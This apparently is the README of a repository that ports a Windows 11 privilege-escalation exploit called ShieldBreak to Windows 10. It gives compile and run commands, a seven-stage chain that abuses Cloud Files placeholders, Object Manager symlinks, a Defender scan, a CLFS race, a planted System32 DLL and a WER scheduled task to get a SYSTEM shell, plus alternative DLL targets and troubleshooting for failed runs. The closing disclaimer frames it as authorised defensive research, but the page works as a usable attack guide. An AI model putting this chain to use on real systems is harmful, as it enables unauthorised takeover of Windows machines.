# ShieldBreak Win10 Port
## ASI Internship Project - Rainfantry

**Goal:** Port MSNightmare's ShieldBreak (Win11 0day) to Windows 10 for ASI's defensive security toolkit.

**Status:** ✓ COMPLETE — Full exploit chain implemented

---

## Quick Start

### Prerequisites
- Windows 10 VM (tested on build 19045/26200)
- Visual Studio 2022 with C++ Desktop Development
- Standard user account (run exploit as NON-admin)
- Windows Defender enabled (required for exploit)

### Step 1: Clone Repository
```cmd
cd C:\Phantom
git clone https://github.com/rainfantry/shieldbreak-win10.git
cd shieldbreak-win10\win10-port
```

### Step 2: Open Developer Command Prompt
```cmd
"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
```
Or use "x64 Native Tools Command Prompt for VS 2022" from Start Menu.

### Step 3: Compile Payload DLL
```cmd
cl.exe /LD warden_win10.cpp /Fe:warden_win10.dll user32.lib advapi32.lib
```

### Step 4: Compile Main Exploit
```cmd
cl.exe shieldbreak_win10.cpp /Fe:shieldbreak_win10.exe /link ntdll.lib CldApi.lib ole32.lib taskschd.lib advapi32.lib user32.lib
```

### Step 5: Run Exploit (as standard user, NOT admin)
```cmd
shieldbreak_win10.exe
```

### Step 6: Verify Success
```cmd
type C:\SHIELDBREAK_SYSTEM.txt
```
If file contains "Running as: SYSTEM" → **EXPLOIT SUCCESSFUL**

---

## Testing Individual Stages

Before running the full exploit, test each stage independently:

### Stage 1: Cloud Files API
```cmd
cl.exe stage1_test_cloudfiles.cpp /Fe:stage1_test.exe /link CldApi.lib ole32.lib
stage1_test.exe
```
**Expected:** "STAGE 1 PASSED: Cloud Files API works on this system!"

### Stage 2: Object Manager Namespaces
```cmd
cl.exe stage2_test_objmgr.cpp /Fe:stage2_test.exe /link ntdll.lib
stage2_test.exe
```
**Expected:** "STAGE 2 PASSED: Object Manager manipulation works!"

### Stage 3: Windows Defender API
```cmd
cl.exe stage3_test_defender.cpp /Fe:stage3_test.exe /link ole32.lib
stage3_test.exe
```
**Expected:** "STAGE 3 PASSED: Windows Defender API accessible!"

---

## The Exploit Chain (7 Stages)

ShieldBreak chains multiple Windows internals techniques to achieve User→SYSTEM privilege escalation:

```
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 1: Cloud Files Provider                                  │
│  CfRegisterSyncRoot() → Fake OneDrive-style sync provider      │
│  CfCreatePlaceholders() → Create "cloud" file (hydrates on     │
│                           access with our payload)              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 2: Object Manager Namespaces                             │
│  \BaseNamedObjects\Restricted\WD_TARGET_<guid>\                 │
│  \BaseNamedObjects\Restricted\WD_SHADOW_<guid>\WD_SCAN →       │
│                                              symlink to workdir │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 3: Windows Defender Scan Trigger                         │
│  MpManagerOpen() → Connect to Defender via MpClient.dll        │
│  MpScanStart() → Trigger scan on our cloud placeholder         │
│  Defender follows symlinks into our controlled directory        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 4: CLFS Race Condition                                   │
│  ReadDirectoryChangesW() → Watch for CLFS log file creation    │
│  LockFileEx() → Lock the CLFS log mid-operation                │
│  Delete symlink → Recreate pointing to phoneinfo.dll           │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 5: DLL Payload Write                                     │
│  CfHydratePlaceholder() → "Hydrate" with warden_win10.dll      │
│  Target: C:\Windows\System32\phoneinfo.dll:stream              │
│  Defender's file operation gets redirected via NTFS ADS        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 6: WER Task Trigger                                      │
│  Create: C:\ProgramData\Microsoft\Windows\WER\ReportQueue\...  │
│  ITaskService → Run "QueueReporting" scheduled task            │
│  WER runs as SYSTEM → loads our payload DLL                    │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 7: SYSTEM Shell                                          │
│  warden_win10.dll executes as SYSTEM                           │
│  Connects to \\.\pipe\SHIELDBREAK_WIN10                        │
│  Writes proof to C:\SHIELDBREAK_SYSTEM.txt                     │
│  Spawns visible SYSTEM cmd.exe                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## File Structure

```
shieldbreak-win10/
├── README.md                              ← This file
├── original/
│   ├── ShieldBreak.cpp                    ← MSNightmare's Win11 source (reference)
│   ├── Report.wer                         ← WER report template
│   └── Warden_payload.cpp                 ← Original payload template
├── win10-port/
│   ├── shieldbreak_win10.cpp              ← MAIN EXPLOIT (full chain)
│   ├── warden_win10.cpp                   ← PAYLOAD DLL
│   ├── stage1_test_cloudfiles.cpp         ← Cloud Files API test
│   ├── stage2_test_objmgr.cpp             ← Object Manager test
│   └── stage3_test_defender.cpp           ← Defender API test
└── analysis/
    └── notes.md                           ← Research notes
```

---

## Win10 Adaptation Notes

### phoneinfo.dll Target
The original ShieldBreak writes to `C:\Windows\System32\phoneinfo.dll`.

| Windows Version | phoneinfo.dll Status | Action |
|-----------------|---------------------|--------|
| Win11 | Doesn't exist | Exploit creates it ✓ |
| Win10 (some builds) | May exist | Need alternative target |

**Check on your VM:**
```cmd
dir C:\Windows\System32\phoneinfo.dll
```

If it exists, alternative targets to research:
- `fveapi.dll` (BitLocker related)
- `edputil.dll` (Enterprise Data Protection)
- Other non-existent DLLs loaded by SYSTEM services

### Windows Build Compatibility
- **Tested:** Win10 19045 (22H2), Win10 26200
- **Required:** Win10 1709+ (Cloud Files API)
- **Defender:** Must be enabled and running

---

## Troubleshooting

### "Cannot load MpClient.dll"
- Windows Defender is disabled or removed
- Solution: Enable Defender in Windows Security settings

### "CfRegisterSyncRoot failed"
- Running as admin (don't do this)
- Cloud Files service not available
- Solution: Run as standard user

### "Object Manager setup failed"
- Running without proper permissions
- Solution: Ensure standard user account

### "WER task trigger failed"
- Task Scheduler service not running
- Solution: `net start schedule`

### No SYSTEM shell received
- Race condition timing issue
- phoneinfo.dll already exists
- Defender blocked the operation
- Solution: Check Event Viewer, try again, or adjust timing

---

## Testing Progress Tracker

| Stage | Component | Status |
|-------|-----------|--------|
| 1 | Cloud Files API | ✓ PASSED |
| 2 | Object Manager | ✓ PASSED |
| 3 | Defender Scan | ✓ PASSED |
| 4 | CLFS Race | INTEGRATED |
| 5 | DLL Write | INTEGRATED |
| 6 | WER Trigger | INTEGRATED |
| 7 | Shell Callback | INTEGRATED |
| **FULL** | **Complete Chain** | **READY** |

---

## Success Indicators

When the exploit works, you'll see:

1. **Named pipe connection** — "SYSTEM SHELL CONNECTED!" in console
2. **Proof file** — `C:\SHIELDBREAK_SYSTEM.txt` contains "Running as: SYSTEM"
3. **SYSTEM cmd.exe** — New command window running as NT AUTHORITY\SYSTEM

Verify with:
```cmd
type C:\SHIELDBREAK_SYSTEM.txt
```

---

## References

- **Original ShieldBreak:** https://github.com/MSNightmare/ShieldBreak
- **RoguePlanet (CVE-2026-50656):** https://github.com/MSNightmare/RoguePlanet
- **Cloud Files API:** https://docs.microsoft.com/en-us/windows/win32/api/cfapi/
- **CLFS:** https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-the-common-log-file-system
- **Object Manager:** Windows Internals, Part 1

---

## Credits

- **MSNightmare (ASI)** — Original ShieldBreak research & mentorship
- **Rainfantry** — Win10 port adaptation

---

## Disclaimer

This tool is for authorized security testing and research only. Use only on systems you own or have explicit permission to test. Part of ASI's defensive security toolkit for helping organizations understand and protect against privilege escalation vulnerabilities.
